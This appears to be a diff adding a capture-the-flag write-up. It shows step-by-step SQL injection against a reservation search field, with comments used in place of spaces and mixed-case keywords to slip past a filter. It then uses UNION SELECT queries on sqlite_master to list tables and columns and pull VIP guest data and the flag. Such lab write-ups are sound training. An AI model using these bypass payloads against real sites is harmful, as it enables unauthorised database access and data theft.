@@ -1,0 +1,20 @@
+There is a search bar where I can search for reservations. the accepted values are from 1001 to 1014. The problem is that whitespaces as well as some keywords (e.g. UNION or OR) are rejected
+For the first filter, whitespaces, simply replace them with /**/
+For the seconds, confuse the check. For example, oR instead of OR and uNiOn instead of UNION  this query, prints out all the reservations available in the website  1001/**/oR/**/1=1--  there are 12 fields, so this query let me know somethings
+1001/**/uNiOn/**/sElEcT/**/1,2,3,4,5,6,7,8,9,10,11,12--  this is what I need to find all the tables  1001/**/uNiOn/**/sElEcT/**/1,2,3,4,5,6,7,8,9,10,11,name/**/fRoM/**/sqlite_master/**/wHeRe/**/type='table'-- the available tables are  events
+reservations
+vip_guestlist
+sqlite_sequence
+
+I’m interested in the vip_guestlist
+
+1001/**/uNiOn/**/sElEcT/**/1,2,3,4,5,6,7,8,9,10,11,sql/**/fRoM/**/sqlite_master/**/wHeRe/**/type='table'/**/aNd/**/name='vip_guestlist'--  these are the available columns: id
+Event_id guest_name
+access_note
+
+Then, the final query:
+
+9999/**/uNiOn/**/sElEcT/**/1,2,3,4,5,6,7,8,9,10,guest_name,access_note/**/fRoM/**/vip_guestlist-- the flag is inside the access note. Use a value which doesn’t exists (e.g. 9999) to obtain no valid results exept for the ones produced by the query
+
+ the flag: offsec{waf_byp4ss_m1x3d_c4se_Vu0Sj8qdV9rhfNqN}
+
